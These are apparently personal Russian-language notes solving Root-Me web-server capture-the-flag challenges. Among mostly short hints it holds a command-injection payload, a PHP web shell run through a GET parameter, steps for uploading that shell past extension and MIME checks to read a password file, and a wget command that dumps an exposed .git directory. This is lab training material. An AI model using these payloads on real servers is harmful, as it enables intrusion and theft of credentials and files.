# Root me 

## Web Server

### 1. HTML - Source code

1) Checked page source ctrl+U.

### 2. HTTP - Open redirect

1) Обратить внимание на ссылку у кнопок соц сетей.
2) Структура состоит из ссылки и её хэша.
3) Узнать какой хэш можно на cyber chief.
4) Остаётся подставить любой другой сайт, посчитать хэш md5 и в бурпе просмотреть запросы. В теле редиректа будет флаг.

### 3. HTTP - User-agent

1) В хэдере изменить содержимое user-agent на admin.
   
### Weak password

1) Можно побрутить логин админ по словарю или вручнуб перебрать подхолящие тупые пароли.

### 4. PHP - Command injection

1) Для иньекции можно использовать & или ; cat index.php

### 5. Backup file

1) Проверить временный файл ~index.php. Идея берётся из owasp гайда

### 6. HTTP - Directory indexing

1) Проверить исходники страницы
2) Пройти по ссылке и следовать подсказкам на испанском блин

### 7. HTTP - Headers

1) Проверить в сыром виде заголовки респонса
2) Заменить значение необычного заголовкан на true

### 8. HTTP - POST

1) Перехватить POST запрос
2) Модифицировать очки для выигрыша в игре

### 9. HTTP - Improper redirect

1) Нарваться на ридеркт потыкаясь по дирректориям или взаимодействуя с формой
2) Просмотреть редирект в бурпе

### 10. HTTP - Verb tampering

1) Легенды гласят о технике подмены типа запроса для вызова ошибки у апача.

### 11. Install files

1) Дирбастинг на основе знания об устанавливаемом фреймворке
2) Поиск сенсетив информэйшн

### 12. CRLF

1) Инекция в бурпе строки аутентификации админа с символами: \r или \n - в urlencode для переноса ошибочной авторизации на строку ниже.

### 13. File upload - Double extensions

1) PHP имеет особенность, что он может парсить код не только из php-файлов, что даёт возможность модифицировать только расширение без MIME type в post запросе.

Англоязычный коллега удачно подсказал пейлоад с get параметром:
```php    
    Create a PHP file named "filename.php" containing this code:
        <?php echo "<pre>".passthru($_GET['command'])."</pre>"; ?>

    This script executes any shell command on the server by inserting a "command" parameter in GET request.
    Upload the PHP script as it is, you get "Wrong file extension!" error.
    Append either .gif|.jpg|.png to the filename, e.g. "filename.php.png".
    Upload the renamed PHP file. The server is fooled, thinks your file is an image and uploads it.
    Click on the "Stored in" URL. Instead of displaying an image, your PHP script is executed.
    Append "?command=ls -a ../../.." to the URL. This shell command is executed and displays the files contained in this directory, including hidden files (like ".passwd").
    Now that we’ve found the ".passwd" file, append "?command=cat ../../../.passwd" to the URL. It displays the content of the ".passwd" file, which is the password. Voila!
```

### 14. File upload - MIME type

```php    
    1) Create a PHP file named "filename.php" containing this code:
        <?php echo "<pre>".passthru($_GET['command'])."</pre>"; ?>

    This script executes any shell command on the server by inserting a "command" parameter in GET request.
    Upload the PHP script as it is, you get "Wrong file extension!" error.
    2) Append either .gif|.jpg|.png to the filename, e.g. "filename.php.png".
    3) Change MIME/type. Upload the renamed PHP file. The server is fooled, thinks your file is an image and uploads it.
    4) Click on the "Stored in" URL. Instead of displaying an image, your PHP script is executed.
    Append "?command=ls -a ../../.." to the URL. This shell command is executed and displays the files contained in this directory, including hidden files (like ".passwd").
    Now that we’ve found the ".passwd" file, append "?command=cat ../../../.passwd" to the URL. It displays the content of the ".passwd" file, which is the password. Voila!
```

### 15. HTTP - Cookies

1) В куках изменить одно значение на admin

### 16. Insecure Code Management

Tools for extracting .git
- https://github.com/arthaud/git-dumper
- https://github.com/internetwache/GitTools
- wget --recursive --no-parent http://challenge01.root-me.org/web-serveur/ch61/.git/ 

